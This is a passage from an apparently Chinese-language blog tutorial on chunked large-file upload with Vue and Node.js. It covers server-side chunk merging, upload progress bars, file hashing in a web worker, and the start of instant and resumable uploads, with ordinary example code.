srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="grG7L"></a></p><h3 id="合并切片"><a href="#合并切片" class="headerlink" title="合并切片"></a>合并切片</h3><p>在接收到前端发送的合并请求后，服务端将文件夹下的所有切片进行合并</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">const http = require(&quot;http&quot;);</span><br><span class="line">  const path = require(&quot;path&quot;);</span><br><span class="line">  const fse = require(&quot;fs-extra&quot;);</span><br><span class="line">  const server = http.createServer();</span><br><span class="line">  const UPLOAD_DIR = path.resolve(__dirname, &quot;..&quot;, &quot;target&quot;); // 大文件存储目录</span><br><span class="line">   const resolvePost = req =&gt;</span><br><span class="line">     new Promise(resolve =&gt; &#123;</span><br><span class="line">       let chunk = &quot;&quot;;</span><br><span class="line">       req.on(&quot;data&quot;, data =&gt; &#123;</span><br><span class="line">         chunk += data;</span><br><span class="line">       &#125;);</span><br><span class="line">       req.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">         resolve(JSON.parse(chunk));</span><br><span class="line">       &#125;);</span><br><span class="line">     &#125;);</span><br><span class="line">   const pipeStream = (path, writeStream) =&gt;</span><br><span class="line">    new Promise(resolve =&gt; &#123;</span><br><span class="line">      const readStream = fse.createReadStream(path);</span><br><span class="line">      readStream.on(&quot;end&quot;, () =&gt; &#123;</span><br><span class="line">        fse.unlinkSync(path);</span><br><span class="line">        resolve();</span><br><span class="line">      &#125;);</span><br><span class="line">      readStream.pipe(writeStream);</span><br><span class="line">    &#125;);</span><br><span class="line">  // 合并切片</span><br><span class="line">   const mergeFileChunk = async (filePath, filename, size) =&gt; &#123;</span><br><span class="line">    const chunkDir = path.resolve(UPLOAD_DIR, filename);</span><br><span class="line">    const chunkPaths = await fse.readdir(chunkDir);</span><br><span class="line">    // 根据切片下标进行排序</span><br><span class="line">    // 否则直接读取目录的获得的顺序可能会错乱</span><br><span class="line">    chunkPaths.sort((a, b) =&gt; a.split(&quot;-&quot;)[1] - b.split(&quot;-&quot;)[1]);</span><br><span class="line">    await Promise.all(</span><br><span class="line">      chunkPaths.map((chunkPath, index) =&gt;</span><br><span class="line">        pipeStream(</span><br><span class="line">          path.resolve(chunkDir, chunkPath),</span><br><span class="line">          // 指定位置创建可写流</span><br><span class="line">          fse.createWriteStream(filePath, &#123;</span><br><span class="line">            start: index * size,</span><br><span class="line">            end: (index + 1) * size</span><br><span class="line">          &#125;)</span><br><span class="line">        )</span><br><span class="line">      )</span><br><span class="line">    );</span><br><span class="line">    fse.rmdirSync(chunkDir); // 合并后删除保存切片的目录</span><br><span class="line">  &#125;;</span><br><span class="line">  server.on(&quot;request&quot;, async (req, res) =&gt; &#123;</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Origin&quot;, &quot;*&quot;);</span><br><span class="line">  res.setHeader(&quot;Access-Control-Allow-Headers&quot;, &quot;*&quot;);</span><br><span class="line">  if (req.method === &quot;OPTIONS&quot;) &#123;</span><br><span class="line">  res.status = 200;</span><br><span class="line">  res.end();</span><br><span class="line">  return;</span><br><span class="line">  &#125;</span><br><span class="line">     if (req.url === &quot;/merge&quot;) &#123;</span><br><span class="line">       const data = await resolvePost(req);</span><br><span class="line">       const &#123; filename,size &#125; = data;</span><br><span class="line">       const filePath = path.resolve(UPLOAD_DIR, `$&#123;filename&#125;`);</span><br><span class="line">       await mergeFileChunk(filePath, filename);</span><br><span class="line">       res.end(</span><br><span class="line">         JSON.stringify(&#123;</span><br><span class="line">           code: 0,</span><br><span class="line">           message: &quot;file merged success&quot;</span><br><span class="line">         &#125;)</span><br><span class="line">       );</span><br><span class="line">     &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">  server.listen(3000, () =&gt; console.log(&quot;正在监听 3000 端口&quot;));</span><br></pre></td></tr></table></figure><p>由于前端在发送合并请求时会携带文件名，服务端根据文件名可以找到上一步创建的切片文件夹<br />接着使用 fs.createWriteStream 创建一个可写流，可写流文件名就是<strong>切片文件夹名 + 后缀名</strong>组合而成<br />随后遍历整个切片文件夹，将切片通过 fs.createReadStream 创建可读流，传输合并到目标文件中<br />值得注意的是每次可读流都会传输到可写流的指定位置，这是通过 createWriteStream 的第二个参数 start&#x2F;end 控制的，目的是能够并发合并多个可读流到可写流中，这样即使流的顺序不同也能传输到正确的位置，所以这里还需要让前端在请求的时候多提供一个 size 参数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="title function_">mergeRequest</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">    <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/merge&quot;</span>,</span><br><span class="line">    <span class="attr">headers</span>: &#123;</span><br><span class="line">      <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">      +         <span class="attr">size</span>: <span class="variable constant_">SIZE</span>,</span><br><span class="line">      <span class="attr">filename</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300704-6beb554c-7db6-4401-96d9-7c92bf363f67.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300704-6beb554c-7db6-4401-96d9-7c92bf363f67.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br />至此一个简单的大文件上传就完成了，接下来我们再此基础上扩展一些额外的功能<br><a name="Pjd1l"></a></p><h2 id="显示上传进度条"><a href="#显示上传进度条" class="headerlink" title="显示上传进度条"></a>显示上传进度条</h2><p>上传进度分两种，一个是每个切片的上传进度，另一个是整个文件的上传进度，而整个文件的上传进度是基于每个切片上传进度计算而来，所以我们先实现切片的上传进度<br><a name="rIKCx"></a></p><h3 id="切片进度条"><a href="#切片进度条" class="headerlink" title="切片进度条"></a>切片进度条</h3><p>XMLHttpRequest 原生支持上传进度的监听，只需要监听 upload.onprogress 即可，我们在原来的 request 基础上传入 onProgress 参数，给 XMLHttpRequest 注册监听事件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// xhr</span></span><br><span class="line"><span class="title function_">request</span>(<span class="params">&#123;</span></span><br><span class="line"><span class="params">  url,</span></span><br><span class="line"><span class="params">  method = <span class="string">&quot;post&quot;</span>,</span></span><br><span class="line"><span class="params">  data,</span></span><br><span class="line"><span class="params">  headers = &#123;&#125;,</span></span><br><span class="line"><span class="params">  +      onProgress = e =&gt; e,</span></span><br><span class="line"><span class="params">  requestList</span></span><br><span class="line"><span class="params">&#125;</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">    +       xhr.<span class="property">upload</span>.<span class="property">onprogress</span> = onProgress;</span><br><span class="line">    xhr.<span class="title function_">open</span>(method, url);</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">keys</span>(headers).<span class="title function_">forEach</span>(<span class="function"><span class="params">key</span> =&gt;</span></span><br><span class="line">      xhr.<span class="title function_">setRequestHeader</span>(key, headers[key])</span><br><span class="line">                                );</span><br><span class="line">    xhr.<span class="title function_">send</span>(data);</span><br><span class="line">    xhr.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="title function_">resolve</span>(&#123;</span><br><span class="line">        <span class="attr">data</span>: e.<span class="property">target</span>.<span class="property">response</span></span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于每个切片都需要触发独立的监听事件，所以还需要一个工厂函数，根据传入的切片返回不同的监听函数<br />在原先的前端上传逻辑中新增监听函数部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 上传切片，同时过滤已上传的切片</span></span><br><span class="line"><span class="keyword">async</span> <span class="title function_">uploadChunks</span>(<span class="params">uploadedList = []</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> requestList = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">    .<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; chunk,hash,index &#125;</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;chunk&quot;</span>, chunk);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;hash&quot;</span>, hash);</span><br><span class="line">      formData.<span class="title function_">append</span>(<span class="string">&quot;filename&quot;</span>, <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span>);</span><br><span class="line">              <span class="keyword">return</span> &#123; formData,index &#125;;</span><br><span class="line">    &#125;)</span><br><span class="line">        .<span class="title function_">map</span>(<span class="keyword">async</span> (&#123; formData,index &#125;) =&gt;</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">        <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000&quot;</span>,</span><br><span class="line">        <span class="attr">data</span>: formData，</span><br><span class="line">                  <span class="attr">onProgress</span>: <span class="variable language_">this</span>.<span class="title function_">createProgressHandler</span>(<span class="variable language_">this</span>.<span class="property">data</span>[index]),</span><br><span class="line">      &#125;)</span><br><span class="line">                );</span><br><span class="line">  <span class="keyword">await</span> <span class="title class_">Promise</span>.<span class="title function_">all</span>(requestList);</span><br><span class="line">  <span class="comment">// 合并切片</span></span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">mergeRequest</span>();</span><br><span class="line">&#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">        index,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index</span><br><span class="line">           <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125;    </span><br><span class="line"><span class="title function_">createProgressHandler</span>(<span class="params">item</span>) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">           item.<span class="property">percentage</span> = <span class="built_in">parseInt</span>(<span class="title class_">String</span>((e.<span class="property">loaded</span> / e.<span class="property">total</span>) * <span class="number">100</span>));</span><br><span class="line">       &#125;;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>每个切片在上传时都会通过监听函数更新 data 数组对应元素的 percentage 属性，之后把将 data 数组放到视图中展示即可<br><a name="yNvn5"></a></p><h3 id="文件进度条"><a href="#文件进度条" class="headerlink" title="文件进度条"></a>文件进度条</h3><p>将每个切片已上传的部分累加，除以整个文件的大小，就能得出当前文件的上传进度，所以这里使用 Vue 计算属性</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">computed</span>: &#123;</span><br><span class="line">  <span class="title function_">uploadPercentage</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span> || !<span class="variable language_">this</span>.<span class="property">data</span>.<span class="property">length</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">const</span> loaded = <span class="variable language_">this</span>.<span class="property">data</span></span><br><span class="line">      .<span class="title function_">map</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">size</span> * item.<span class="property">percentage</span>)</span><br><span class="line">      .<span class="title function_">reduce</span>(<span class="function">(<span class="params">acc, cur</span>) =&gt;</span> acc + cur);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">parseInt</span>((loaded / <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">size</span>).<span class="title function_">toFixed</span>(<span class="number">2</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>最终视图如下<br /><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300712-d2e412fa-ed42-4452-98fb-c5a728d44a55.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300712-d2e412fa-ed42-4452-98fb-c5a728d44a55.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="rI21c"></a></p><h1 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h1><p>断点续传的原理在于前端&#x2F;服务端需要<code>记住</code>已上传的切片，这样下次上传就可以跳过之前已上传的部分，有两种方案实现记忆的功能</p><ul><li>前端使用 localStorage 记录已上传的切片 hash</li><li>服务端保存已上传的切片 hash，前端每次上传前向服务端获取已上传的切片</li></ul><p>第一种是前端的解决方案，第二种是服务端，而前端方案有一个缺陷，如果换了个浏览器就失去了记忆的效果，所以这里选取后者<br><a name="GWcjL"></a></p><h2 id="生成-hash"><a href="#生成-hash" class="headerlink" title="生成 hash"></a>生成 hash</h2><p>无论是前端还是服务端，都必须要生成文件和切片的 hash，<code>之前我们使用文件名 + 切片下标作为切片 hash</code>，这样做文件名一旦修改就失去了效果，而事实上只要文件内容不变，hash 就不应该变化，所以正确的做法是<code>根据文件内容生成 hash</code>，所以我们修改一下 hash 的生成规则<br />这里用到另一个库 <code>spark-md5</code>，它可以根据文件内容计算出文件的 hash 值，另外考虑到如果上传一个超大文件，读取文件内容计算 hash 是非常耗费时间的，并且会<code>引起 UI 的阻塞</code>，导致页面假死状态，所以我们使用 web-worker 在 worker 线程计算 hash，这样用户仍可以在主界面正常的交互<br />由于实例化 web-worker 时，参数是一个 js 文件路径且不能跨域，所以我们单独创建一个 hash.js 文件放在 public 目录下，另外在 worker 中也是不允许访问 dom 的，但它提供了<code>importScripts</code> 函数用于导入外部脚本，通过它导入 spark-md5</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /public/hash.js</span></span><br><span class="line">self.importScripts(<span class="string">&quot;/spark-md5.min.js&quot;</span>); <span class="comment">// 导入脚本</span></span><br><span class="line"><span class="comment">// 生成文件 hash</span></span><br><span class="line">self.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; fileChunkList &#125; = e.<span class="property">data</span>;</span><br><span class="line">  <span class="keyword">const</span> spark = <span class="keyword">new</span> self.<span class="property">SparkMD5</span>.<span class="title class_">ArrayBuffer</span>();</span><br><span class="line">  <span class="keyword">let</span> percentage = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">let</span> count = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">loadNext</span> = index =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>();</span><br><span class="line">    reader.<span class="title function_">readAsArrayBuffer</span>(fileChunkList[index].<span class="property">file</span>);</span><br><span class="line">    reader.<span class="property">onload</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">      count++;</span><br><span class="line">      spark.<span class="title function_">append</span>(e.<span class="property">target</span>.<span class="property">result</span>);</span><br><span class="line">      <span class="keyword">if</span> (count === fileChunkList.<span class="property">length</span>) &#123;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          <span class="attr">percentage</span>: <span class="number">100</span>,</span><br><span class="line">          <span class="attr">hash</span>: spark.<span class="title function_">end</span>()</span><br><span class="line">        &#125;);</span><br><span class="line">        self.<span class="title function_">close</span>();</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        percentage += <span class="number">100</span> / fileChunkList.<span class="property">length</span>;</span><br><span class="line">        self.<span class="title function_">postMessage</span>(&#123;</span><br><span class="line">          percentage</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">// 递归计算下一个切片</span></span><br><span class="line">        <span class="title function_">loadNext</span>(count);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="title function_">loadNext</span>(<span class="number">0</span>);</span><br><span class="line">&#125;;</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>在 worker 线程中，接受文件切片 fileChunkList，利用 FileReader 读取每个切片的 ArrayBuffer 并不断传入 spark-md5 中，每计算完一个切片通过 postMessage 向主线程发送一个进度事件，全部完成后将最终的 hash 发送给主线程<br /><code>spark-md5 需要根据所有切片才能算出一个 hash 值，不能直接将整个文件放入计算，否则即使不同文件也会有相同的 hash，具体可以看官方文档</code><br /><a href="https://www.npmjs.com/package/spark-md5">spark-md5</a><br />接着编写主线程与 worker 线程通讯的逻辑</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">+    <span class="comment">// 生成文件 hash（web-worker）</span></span><br><span class="line">  +    <span class="title function_">calculateHash</span>(<span class="params">fileChunkList</span>) &#123;</span><br><span class="line">    +      <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">      +       <span class="comment">// 添加 worker 属性</span></span><br><span class="line">        +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span> = <span class="keyword">new</span> <span class="title class_">Worker</span>(<span class="string">&quot;/hash.js&quot;</span>);</span><br><span class="line">      +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="title function_">postMessage</span>(&#123; fileChunkList &#125;);</span><br><span class="line">      +        <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">worker</span>.<span class="property">onmessage</span> = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        +          <span class="keyword">const</span> &#123; percentage, hash &#125; = e.<span class="property">data</span>;</span><br><span class="line">        +          <span class="variable language_">this</span>.<span class="property">hashPercentage</span> = percentage;</span><br><span class="line">        +          <span class="keyword">if</span> (hash) &#123;</span><br><span class="line">          +            <span class="title function_">resolve</span>(hash);</span><br><span class="line">        +          &#125;</span><br><span class="line">          +        &#125;;</span><br><span class="line">      +      &#125;);</span><br><span class="line">  &#125;,</span><br><span class="line"><span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  +     <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">data</span> = fileChunkList.<span class="title function_">map</span>(<span class="function">(<span class="params">&#123; file &#125;，index</span>) =&gt;</span> (&#123;</span><br><span class="line">    +       <span class="attr">fileHash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span>,</span><br><span class="line">    <span class="attr">chunk</span>: file,</span><br><span class="line">    <span class="attr">hash</span>: <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>.<span class="property">name</span> + <span class="string">&quot;-&quot;</span> + index, <span class="comment">// 文件名 + 数组下标</span></span><br><span class="line">    <span class="attr">percentage</span>:<span class="number">0</span></span><br><span class="line">  &#125;));</span><br><span class="line">  <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">uploadChunks</span>();</span><br><span class="line">&#125;   </span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>主线程使用 <code>postMessage</code> 给 worker 线程传入所有切片 fileChunkList，并监听 worker 线程发出的 postMessage 事件拿到文件 hash<br />加上显示计算 hash 的进度条，看起来像这样<br /><img src="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300867-a57f7705-b2a5-4b7b-b47a-3e31dcff830f.webp" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2020/webp/164572/1588598300867-a57f7705-b2a5-4b7b-b47a-3e31dcff830f.webp" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif"><br><a name="Yej4T"></a></p><h2 id="文件秒传"><a href="#文件秒传" class="headerlink" title="文件秒传"></a>文件秒传</h2><p>在实现断点续传前先简单介绍一下文件秒传<br />所谓的文件秒传，即在服务端已经存在了上传的资源，所以当用户<code>再次上传</code>时会直接提示上传成功<br />文件秒传需要依赖上一步生成的 hash，即在<code>上传前</code>，先计算出文件 hash，并把 hash 发送给服务端进行验证，由于 hash 的唯一性，所以一旦服务端能找到 hash 相同的文件，则直接返回上传成功的信息即可</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">async</span> <span class="title function_">verifyUpload</span>(<span class="params">filename, fileHash</span>) &#123;</span><br><span class="line">       <span class="keyword">const</span> &#123; data &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">request</span>(&#123;</span><br><span class="line">           <span class="attr">url</span>: <span class="string">&quot;http://localhost:3000/verify&quot;</span>,</span><br><span class="line">         <span class="attr">headers</span>: &#123;</span><br><span class="line">               <span class="string">&quot;content-type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">             &#125;,</span><br><span class="line">                <span class="attr">data</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;</span><br><span class="line">                     filename,</span><br><span class="line">                      fileHash</span><br><span class="line">                    &#125;)</span><br><span class="line">                 &#125;);</span><br><span class="line">      <span class="keyword">return</span> <span class="title class_">JSON</span>.<span class="title function_">parse</span>(data);</span><br><span class="line">    &#125;,</span><br><span class="line">  <span class="keyword">async</span> <span class="title function_">handleUpload</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (!<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">const</span> fileChunkList = <span class="variable language_">this</span>.<span class="title function_">createFileChunk</span>(<span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">file</span>);</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">container</span>.<span class="property">hash</span> = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">calculateHash</span>(fileChunkList);</span><br><span class="line">       <span class="keyword">const</span> &#123; shouldUpload &#125; = <span class="keyword">await</span> <span class="variable language_">this</span>.<span class="title function_">verifyUpload</span>(</span><br><span class="line">           <span class="variable language_">this</span>.<span 